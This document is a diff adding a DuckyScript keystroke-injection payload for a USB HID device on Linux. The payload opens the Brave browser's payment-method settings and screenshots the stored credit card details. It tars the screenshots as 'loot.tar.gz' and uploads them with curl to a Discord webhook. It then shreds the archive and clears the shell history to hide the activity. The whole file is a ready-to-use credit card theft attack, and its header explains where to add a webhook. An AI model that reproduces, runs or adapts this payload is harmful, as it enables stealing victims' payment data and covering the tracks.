@@ -1,0 +1,87 @@
+REM TITLE: Brave Credit Card Exfil Linux
+REM AUTHOR: OSINTI4L
+REM TARGET OS: Linux (tested on Pop!_OS)
+REM DESCRIPTION: Opens Brave Browser, navigates to payment methods settings menu, and takes a screenshot of the credit card credentials on file. It then closes the browser, tarballs all screenshots in Pictures/Screenshots as "loot.tar.gz", and exfiltrates them via Discord webhook. Terminal session history is cleared and the tarball is shredded post exfiltration to obfuscate activity. To work, add Discord webhook to line 74 and path to Screenshots directory on line 76.
+
+REM Begin attack:
+ATTACKMODE HID
+DELAY 1000
+
+REM Launching Brave Browser:
+INJECT_MOD
+    GUI
+    DELAY 200
+    STRING brav
+    DELAY 100
+    ENTER
+DELAY 500
+
+REM Opening settings menu and inputting arrow key strokes via DOWN loop to access payment method settings:
+ALT f
+DELAY 100
+VAR $FOO = 10
+    WHILE ( $FOO > 0)
+    DOWN
+    $FOO = ( $FOO - 1 )
+END_WHILE
+ENTER
+DELAY 150
+DOWN
+DELAY 200
+ENTER
+DELAY 200
+
+REM Utilizing TAB and arrow keys to navigate to payment method settings menu:
+TAB
+TAB
+TAB
+TAB
+TAB
+DELAY 25
+ENTER
+DELAY 25
+ENTER
+DELAY 100
+
+REM Taking screenshot of credit card stored in browser:
+PRINTSCREEN
+DELAY 150
+ENTER
+DELAY 150
+
+REM Opening window settings and using DOWN loop to select "close", closing browser to obfuscate that Brave was opened:
+ALT SPACE
+DELAY 200
+VAR $FEE = 8
+    WHILE ( $FEE > 0 )
+    DOWN
+    $FEE = ( $FEE -1 )
+END_WHILE
+ENTER
+
+REM Exfiltration phase.
+REM Opening terminal window:
+DELAY 150
+CTRL ALT t
+DELAY 300
+
+REM Changing directory and creating tarball (loot.tar.gz) of all files in Pictures/Screenshots directory:
+STRINGLN cd Pictures/Screenshots
+STRINGLN tar -czf loot.tar.gz *
+    DELAY 75
+
+REM Exfiltrating "loot.tar.gz" via Discord webhook:
+DEFINE WEBHOOK_URL https://discord.com/api/webhooks/PLACE/DISCORD/WEBHOOK
+    STRINGLN curl -X POST -H "Content-Type: multipart/form-data" \
+    STRINGLN -F "file=@/home/USER/Pictures/Screenshots/loot.tar.gz" \
+    STRINGLN -F "content=$ Loot Incoming $" \
+    STRINGLN WEBHOOK_URL
+ 	DELAY 100
+
+REM Obfuscation phase.
+REM Shredding "loot.tar.gz", clearing terminal session history, and exiting terminal to obfuscate activity:
+STRINGLN shred -fuz loot.tar.gz
+DELAY 50
+STRINGLN history -c
+DELAY 50
+STRINGLN exit
